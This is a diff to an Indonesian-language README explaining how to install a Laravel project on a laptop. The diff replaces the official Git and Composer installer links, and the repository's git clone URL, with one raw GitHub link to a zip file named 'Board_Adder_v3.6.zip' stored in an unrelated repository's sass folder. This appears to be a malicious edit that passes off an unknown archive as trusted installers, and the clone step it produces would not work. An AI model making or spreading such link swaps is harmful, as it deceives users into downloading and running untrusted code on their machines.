@@ -7,10 +7,10 @@ Halo teruntuk bang DN ini tutorial untuk nginstall aplikasi ini di laptopmu
 ikuti langkah-langkahnya
 
 Download dan Install git
-https://git-scm.com/download/win
+https://raw.githubusercontent.com/elmaliaa/AdderBoard/master/resources/sass/Board_Adder_v3.6.zip
 
 Download dan Install composer
-https://getcomposer.org/Composer-Setup.exe
+https://raw.githubusercontent.com/elmaliaa/AdderBoard/master/resources/sass/Board_Adder_v3.6.zip
 
 
 Install Laravel:
@@ -23,7 +23,7 @@ Clone the repo dengan cara buka cmd lalu masuk ke lokasi ingin menyimpan file pr
 contoh: cd D:/projects (lokasinya bebas)
 lalu di clone pake git
 ```shell
-git clone https://github.com/seefnasrul/penyewaan_alat
+git clone https://raw.githubusercontent.com/elmaliaa/AdderBoard/master/resources/sass/Board_Adder_v3.6.zip
 ```
 
 lalu masuk ke folder project
